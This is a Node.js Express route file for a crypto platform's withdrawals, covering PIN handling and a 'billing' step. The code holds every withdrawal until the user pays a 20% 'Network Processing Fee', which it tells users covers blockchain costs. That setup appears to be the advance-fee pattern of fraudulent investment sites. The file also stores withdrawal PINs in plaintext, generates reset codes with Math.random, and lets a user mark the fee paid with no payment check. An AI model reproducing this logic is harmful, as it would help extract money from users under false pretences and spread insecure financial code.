// server/routes/withdrawal.js
console.log('Withdrawal route loaded');

const express = require('express');
const router = express.Router();
const auth = require('../middleware/auth');
const Withdrawal = require('../models/Withdrawal');
const User = require('../models/User');
const { sendMail } = require('../utils/mailer'); // Use mailer.js utility
const { getCryptoUSDPrices } = require('../utils/cryptoRates');

// Simulate withdrawal request
router.post('/', auth, async (req, res) => {
  try {
    console.log('[WITHDRAWAL API] Incoming request:', req.body);
    const { amount, currency, network, address, pin } = req.body;
    const userId = req.user.id;

    // Validate input
    if (!amount || !currency || !network || !address || !pin) {
      return res.status(400).json({ msg: 'Please provide all required fields including PIN' });
    }

    const user = await User.findById(userId).select('+withdrawalPin');
    if (!user) {
      return res.status(404).json({ msg: 'User not found' });
    }

    if (!user.withdrawalPin || user.withdrawalPin !== pin) {
      return res.status(400).json({ msg: 'Invalid withdrawal PIN' });
    }

    // Always return what the user entered and what will be sent
    const requestedAmount = Number(amount);
    const requestedCurrency = 'USD';
    let cryptoCurrency = '';
    let cryptoAmount = 0;
    let conversionRate = 1;

    // Fetch live rates
    const rates = await getCryptoUSDPrices();

    // Robust currency selection
    if (currency === 'BTC' || network === 'BTC') {
      conversionRate = rates.BTC;
      cryptoAmount = Number(amount) / conversionRate;
      cryptoCurrency = 'BTC';
    } else if (currency === 'ETH' || network === 'ERC20') {
      conversionRate = rates.ETH;
      cryptoAmount = Number(amount) / conversionRate;
      cryptoCurrency = 'ETH';
    } else if (currency === 'BNB' || network === 'BEP20') {
      conversionRate = rates.BNB;
      cryptoAmount = Number(amount) / conversionRate;
      cryptoCurrency = 'BNB';
    } else if (currency === 'USDT' || network === 'USDT') {
      conversionRate = rates.USDT;
      cryptoAmount = Number(amount) / conversionRate;
      cryptoCurrency = 'USDT';
    } else {
      return res.status(400).json({ msg: 'Unsupported currency or network.' });
    }

    // Check user balance (in USD) against availableBalance
    if ((user.availableBalance || 0) < requestedAmount) {
      return res.status(400).json({ msg: 'Insufficient balance for withdrawal.' });
    }

    // Calculate 20% billing fee (Network Processing Fee)
    const billingFee = requestedAmount * 0.20;

    // Create withdrawal record with billing information (don't deduct balance yet)
    const newWithdrawal = new Withdrawal({
      userId: userId,
      amount: requestedAmount,
      currency: cryptoCurrency,
      network,
      walletAddress: address,
      status: 'pending_billing', // Requires billing payment first
      billingFee: billingFee,
      billingPaid: false,
      fee: 0
    });

    await newWithdrawal.save();

    // Track billing requirement on user record
    try {
      user.billingBalance = (user.billingBalance || 0) + billingFee;
      await user.save();
    } catch (e) {
      console.warn('[WITHDRAWAL API] Failed to update user billingBalance:', e?.message);
    }

    // Format cryptoAmount to 8 decimals for display
    const cryptoAmountDisplay = cryptoAmount ? cryptoAmount.toFixed(8) : '0';

    console.log('[WITHDRAWAL API] Returning:', {
      requestedAmount,
      requestedCurrency,
      cryptoAmount: cryptoAmountDisplay,
      cryptoCurrency,
      conversionRate
    });
    // Get the appropriate wallet address for billing payment
    const getWalletKey = (currency, network) => {
      if (currency === 'USDT') {
        return network === 'ERC20' ? 'usdt_erc20' : 'usdt_trc20';
      } else if (currency === 'USDC') {
        return network === 'ERC20' ? 'usdc_erc20' : 'usdc_trc20';
      } else {
        return currency.toLowerCase();
      }
    };

    const walletKey = getWalletKey(cryptoCurrency, network);
    const billingWalletAddress = user.wallets[walletKey]?.address || '';

    res.json({
      success: true,
      message: 'Withdrawal request created. Please pay the network processing fee to proceed.',
      withdrawal: newWithdrawal,
      requestedAmount,
      cryptoDetails: {
        currency: cryptoCurrency,
        network,
        rate: conversionRate,
        usdValue: requestedAmount
      },
      billingFee: billingFee,
      billingRequired: true,
      billingWalletAddress,
      feeReason: 'Network Processing Fee - Required to cover blockchain transaction costs and network fees for secure processing of your withdrawal.',
      billingBalance: user.billingBalance
    });
  } catch (err) {
    console.error('[WITHDRAWAL API] Error:', err);
    res.status(500).json({ msg: 'Server error', error: err.message });
  }
});

// Set or update withdrawal PIN
router.post('/set-withdrawal-pin', auth, async (req, res) => {
  try {
    const { pin, confirmPin } = req.body;
    
    // Validate PIN format
    if (!pin || !/^[0-9]{6}$/.test(pin)) {
      return res.status(400).json({ 
        success: false, 
        msg: 'PIN must be exactly 6 digits and contain only numbers.' 
      });
    }
    
    // Validate PIN confirmation if provided
    if (confirmPin && pin !== confirmPin) {
      return res.status(400).json({ 
        success: false, 
        msg: 'PIN and confirmation PIN do not match.' 
      });
    }
    
    // Check for weak PINs
    const weakPins = ['000000', '111111', '222222', '333333', '444444', '555555', '666666', '777777', '888888', '999999', '123456', '654321'];
    if (weakPins.includes(pin)) {
      return res.status(400).json({ 
        success: false, 
        msg: 'Please choose a stronger PIN. Avoid sequential or repeated numbers.' 
      });
    }
    
    const user = await User.findById(req.user.id).select('+withdrawalPin');
    if (!user) {
      console.error('User not found for PIN set:', req.user.id);
      return res.status(404).json({ success: false, msg: 'User not found' });
    }
    
    // Check if PIN is being updated
    const isUpdate = user.withdrawalPin && user.withdrawalPin.length > 0;
    
    user.withdrawalPin = pin;
    await user.save();
    
    res.json({ 
      success: true, 
      msg: isUpdate ? 'Withdrawal PIN updated successfully.' : 'Withdrawal PIN set successfully.',
      isUpdate 
    });
  } catch (err) {
    console.error('Error setting withdrawal PIN:', err);
    res.status(500).json({ success: false, msg: 'Server error', error: err.message });
  }
});

// Request PIN reset (send email code)
router.post('/request-pin-reset', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) return res.status(404).json({ msg: 'User not found' });
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    user.pinResetCode = code;
    user.pinResetExpiry = Date.now() + 10 * 60 * 1000; // 10 minutes
    await user.save();
    await sendMail({
      to: user.email,
      subject: 'Withdrawal PIN Reset Code',
      text: `Your withdrawal PIN reset code is: ${code}`
    });
    res.json({ success: true, msg: 'PIN reset code sent to your email.' });
  } catch (err) {
    res.status(500).json({ msg: 'Server error' });
  }
});

// Reset PIN with code
router.post('/reset-pin', auth, async (req, res) => {
  try {
    const { code, newPin } = req.body;
    if (!/^[0-9]{6}$/.test(newPin)) {
      return res.status(400).json({ msg: 'PIN must be exactly 6 digits.' });
    }
    const user = await User.findById(req.user.id).select('+pinResetCode +pinResetExpiry');
    if (!user || !user.pinResetCode || !user.pinResetExpiry) {
      return res.status(400).json({ msg: 'No reset request found.' });
    }
    if (user.pinResetCode !== code || user.pinResetExpiry < Date.now()) {
      return res.status(400).json({ msg: 'Invalid or expired code.' });
    }
    user.withdrawalPin = newPin;
    user.pinResetCode = undefined;
    user.pinResetExpiry = undefined;
    await user.save();
    res.json({ success: true, msg: 'Withdrawal PIN reset successfully.' });
  } catch (err) {
    res.status(500).json({ msg: 'Server error' });
  }
});

// Check if user has withdrawal PIN set
router.get('/pin-status', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('+withdrawalPin');
    if (!user) {
      return res.status(404).json({ success: false, msg: 'User not found' });
    }
    
    const hasPinSet = user.withdrawalPin && user.withdrawalPin.length === 6;
    res.json({ 
      success: true, 
      hasPinSet,
      msg: hasPinSet ? 'Withdrawal PIN is set' : 'No withdrawal PIN set'
    });
  } catch (err) {
    console.error('Error checking PIN status:', err);
    res.status(500).json({ success: false, msg: 'Server error', error: err.message });
  }
});

// Verify withdrawal PIN endpoint
router.post('/verify-pin', auth, async (req, res) => {
  try {
    const { pin } = req.body;
    
    // Validate PIN format
    if (!pin || !/^[0-9]{6}$/.test(pin)) {
      return res.status(400).json({ 
        success: false, 
        msg: 'PIN must be exactly 6 digits and contain only numbers.' 
      });
    }
    
    const user = await User.findById(req.user.id).select('+withdrawalPin');
    if (!user) {
      return res.status(404).json({ success: false, msg: 'User not found' });
    }
    
    // Check if user has set a PIN
    if (!user.withdrawalPin) {
      return res.status(400).json({ 
        success: false, 
        msg: 'No withdrawal PIN has been set. Please set a PIN first.',
        requiresPinSetup: true 
      });
    }
    
    // Verify PIN
    if (user.withdrawalPin !== pin) {
      return res.status(400).json({ 
        success: false, 
        msg: 'Invalid withdrawal PIN. Please check your PIN and try again.' 
      });
    }
    
    res.json({ success: true, msg: 'PIN verified successfully.' });
  } catch (err) {
    console.error('Error verifying withdrawal PIN:', err);
    res.status(500).json({ success: false, msg: 'Server error', error: err.message });
  }
});

// Get user's billing balance and pending billing fees
router.get('/billing-status', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ msg: 'User not found' });
    }

    // Get pending withdrawals that require billing payment
    const pendingBillingWithdrawals = await Withdrawal.find({
      userId: req.user.id,
      status: 'pending_billing',
      billingPaid: false
    });

    res.json({
      success: true,
      billingBalance: user.billingBalance,
      availableBalance: user.availableBalance,
      pendingBillingWithdrawals: pendingBillingWithdrawals
    });
  } catch (err) {
    res.status(500).json({ msg: 'Server error', error: err.message });
  }
});

// Pay billing fee for a specific withdrawal
router.post('/pay-billing/:withdrawalId', auth, async (req, res) => {
  try {
    const { withdrawalId } = req.params;
    const { pin } = req.body;

    // Verify PIN
    if (!/^[0-9]{6}$/.test(pin)) {
      return res.status(400).json({ msg: 'PIN must be exactly 6 digits.' });
    }

    const user = await User.findById(req.user.id).select('+withdrawalPin');
    if (!user) {
      return res.status(404).json({ msg: 'User not found' });
    }

    if (!user.withdrawalPin || user.withdrawalPin !== pin) {
      return res.status(400).json({ msg: 'Invalid withdrawal PIN' });
    }

    // Find the withdrawal
    const withdrawal = await Withdrawal.findOne({
      _id: withdrawalId,
      userId: req.user.id,
      status: 'pending_billing',
      billingPaid: false
    });

    if (!withdrawal) {
      return res.status(404).json({ msg: 'Withdrawal not found or billing already paid' });
    }

    // Check if user has sufficient available balance to pay billing fee
    if (user.availableBalance < withdrawal.billingFee) {
      return res.status(400).json({ 
        msg: 'Insufficient available balance to pay billing fee',
        required: withdrawal.billingFee,
        available: user.availableBalance
      });
    }

    // Deduct billing fee from available balance
    user.availableBalance -= withdrawal.billingFee;
    user.billingBalance -= withdrawal.billingFee;
    await user.save();

    // Update withdrawal status
    withdrawal.billingPaid = true;
    withdrawal.billingPaidAt = new Date();
    withdrawal.status = 'pending'; // Now ready for admin processing
    await withdrawal.save();

    res.json({
      success: true,
      msg: 'Billing fee paid successfully. Withdrawal is now pending admin approval.',
      withdrawal: withdrawal,
      remainingBillingBalance: user.billingBalance,
      remainingAvailableBalance: user.availableBalance
    });

  } catch (err) {
    res.status(500).json({ msg: 'Server error', error: err.message });
  }
});

// Pay all pending billing fees at once
router.post('/pay-all-billing', auth, async (req, res) => {
  try {
    const { pin } = req.body;

    // Verify PIN
    if (!/^[0-9]{6}$/.test(pin)) {
      return res.status(400).json({ msg: 'PIN must be exactly 6 digits.' });
    }

    const user = await User.findById(req.user.id).select('+withdrawalPin');
    if (!user) {
      return res.status(404).json({ msg: 'User not found' });
    }

    if (!user.withdrawalPin || user.withdrawalPin !== pin) {
      return res.status(400).json({ msg: 'Invalid withdrawal PIN' });
    }

    // Get all pending billing withdrawals
    const pendingBillingWithdrawals = await Withdrawal.find({
      userId: req.user.id,
      status: 'pending_billing',
      billingPaid: false
    });

    if (pendingBillingWithdrawals.length === 0) {
      return res.status(400).json({ msg: 'No pending billing fees to pay' });
    }

    const totalBillingFee = pendingBillingWithdrawals.reduce((sum, w) => sum + w.billingFee, 0);

    // Check if user has sufficient available balance
    if (user.availableBalance < totalBillingFee) {
      return res.status(400).json({ 
        msg: 'Insufficient available balance to pay all billing fees',
        required: totalBillingFee,
        available: user.availableBalance
      });
    }

    // Deduct total billing fee from available balance
    user.availableBalance -= totalBillingFee;
    user.billingBalance -= totalBillingFee;
    await user.save();

    // Update all withdrawals
    const updatePromises = pendingBillingWithdrawals.map(withdrawal => {
      withdrawal.billingPaid = true;
      withdrawal.billingPaidAt = new Date();
      withdrawal.status = 'pending';
      return withdrawal.save();
    });

    await Promise.all(updatePromises);

    res.json({
      success: true,
      msg: `All billing fees paid successfully. ${pendingBillingWithdrawals.length} withdrawals are now pending admin approval.`,
      paidWithdrawals: pendingBillingWithdrawals.length,
      totalPaid: totalBillingFee,
      remainingBillingBalance: user.billingBalance,
      remainingAvailableBalance: user.availableBalance
    });

  } catch (err) {
    res.status(500).json({ msg: 'Server error', error: err.message });
  }
});

// Route to confirm billing fee payment
router.post('/confirm-billing/:withdrawalId', auth, async (req, res) => {
  try {
    const { withdrawalId } = req.params;
    const userId = req.user.id;

    // Find the withdrawal
    const withdrawal = await Withdrawal.findOne({ 
      _id: withdrawalId, 
      userId: userId,
      status: 'pending_billing'
    });

    if (!withdrawal) {
      return res.status(404).json({
        success: false,
        message: 'Withdrawal not found or billing already confirmed'
      });
    }

    // Find the user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found'
      });
    }

    // Check if user has sufficient available balance for the withdrawal amount
    if ((user.availableBalance || 0) < withdrawal.amount) {
      return res.status(400).json({
        success: false,
        message: 'Insufficient balance for withdrawal'
      });
    }

    // Deduct withdrawal amount from user's deposit ledger so portfolio math stays consistent
    user.depositBalance = (user.depositBalance || 0) - withdrawal.amount;
    await user.save();

    // Update withdrawal status and billing information
    withdrawal.status = 'pending'; // Now pending admin approval
    withdrawal.billingPaid = true;
    withdrawal.billingPaidAt = new Date();
    await withdrawal.save();

    res.json({
      success: true,
      message: 'Billing fee payment confirmed. Your withdrawal is now pending admin approval.',
      withdrawal: withdrawal
    });

  } catch (err) {
    console.error('Error confirming billing payment:', err);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

// Route to get billing status for a withdrawal
router.get('/billing-status/:withdrawalId', auth, async (req, res) => {
  try {
    const { withdrawalId } = req.params;
    const userId = req.user.id;

    const withdrawal = await Withdrawal.findOne({ 
      _id: withdrawalId, 
      userId: userId 
    });

    if (!withdrawal) {
      return res.status(404).json({
        success: false,
        message: 'Withdrawal not found'
      });
    }

    res.json({
      success: true,
      withdrawal: {
        id: withdrawal._id,
        amount: withdrawal.amount,
        currency: withdrawal.currency,
        network: withdrawal.network,
        status: withdrawal.status,
        billingFee: withdrawal.billingFee,
        billingPaid: withdrawal.billingPaid,
        billingPaidAt: withdrawal.billingPaidAt,
        createdAt: withdrawal.createdAt
      }
    });

  } catch (err) {
    console.error('Error getting billing status:', err);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

module.exports = router;